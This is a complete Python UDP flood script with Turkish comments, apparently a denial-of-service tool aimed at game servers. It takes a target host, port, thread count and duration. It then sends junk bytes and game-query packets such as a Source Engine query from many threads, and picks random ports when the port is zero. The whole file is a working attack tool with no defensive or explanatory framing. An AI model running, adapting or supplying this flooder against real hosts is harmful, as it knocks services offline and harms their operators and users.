#!/usr/bin/env python3
import socket, sys, time, os, threading, random, signal

# Kullanım kontrolü (Hata vermemesi için)
if len(sys.argv) < 5:
    sys.exit()

target, port, threads, duration = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4])

# Stop komutu geldiğinde anında kapanma
def signal_handler(sig, frame):
    os._exit(0)
signal.signal(signal.SIGINT, signal_handler)

# Mermi çekirdekleri (Payloadlar)
payloads = [
    bytes.fromhex("05ca7f169c11f9f654") + random._urandom(500),
    bytes.fromhex("545333494e49543100010000000000000000000000000000"),
    random._urandom(1400),
    bytes.fromhex("ffffffff54536f7572636520456e67696e6520517565727900"),
    bytes.fromhex("00000000040000000100000005000000") + random._urandom(100)
]

def vurus():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2048*1024)
    except: pass
    timeout = time.time() + duration
    while time.time() < timeout:
        try:
            p = port if port != 0 else random.randint(1, 65535)
            s.sendto(random.choice(payloads), (target, p))
        except: break

# Yazılar temizlendi, sessiz vuruş
print(f"Mermiler yağdırılıyor...")

for _ in range(threads):
    t = threading.Thread(target=vurus)
    t.daemon = True
    t.start()

try:
    time.sleep(duration)
    os._exit(0)
except:
    os._exit(0)
